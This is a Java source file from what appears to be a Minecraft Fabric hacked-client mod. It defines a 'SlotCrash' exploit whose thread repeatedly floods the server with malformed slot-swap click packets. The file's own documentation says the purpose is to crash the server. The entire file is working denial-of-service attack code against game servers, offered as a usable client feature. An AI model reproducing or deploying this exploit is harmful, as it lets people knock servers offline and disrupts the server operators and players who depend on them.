package io.github.spigotrce.paradiseclientfabric.exploit.impl;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import net.minecraft.client.MinecraftClient;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.exploit.Exploit;

/**
 * Marked for removal.
 * This class represents a specific type of exploit that crashes the game by continuously sending
 * slot swap packets to the server.
 *
 * @author Spigotrce
 * @since 1.6
 */
public class SlotCrashExploit extends Exploit {

    /**
     * Constructs a new instance of SlotCrashExploit with the given name and description.
     */
    public SlotCrashExploit() {
        super("slotcrash", "SlotSwap crash exploit");
    }

    /**
     * Executes the exploit by starting a new thread that continuously sends slot swap packets to the server.
     * The thread will run until the exploit is stopped.
     */
    @Override
    public void execute() {
        new Thread(() -> {
            Helper.printChatMessage("[CrashExploit] [SlotCrash] Crashing...");
            while (isRunning()) {
                for (int i = 0; i < 6; ++i) {
                    Int2ObjectArrayMap<ItemStack> map = new Int2ObjectArrayMap<>();
                    map.put(0, new ItemStack(Items.ACACIA_BOAT, 1));
                    assert MinecraftClient.getInstance().player != null;
                    MinecraftClient.getInstance().player.networkHandler.sendPacket(new ClickSlotC2SPacket(
                            MinecraftClient.getInstance().player.currentScreenHandler.syncId,
                            MinecraftClient.getInstance().player.currentScreenHandler.getRevision(),
                            36,
                            -1,
                            SlotActionType.SWAP,
                            MinecraftClient.getInstance().player.currentScreenHandler.getCursorStack().copy(),
                            map
                    ));
                }

                try {
                    Thread.sleep(50);
                } catch (InterruptedException e) {
                    Helper.printChatMessage("[CrashExploit] [SlotCrash] Unable to sleep 50ms");
                }
            }
        }).start();
    }
}
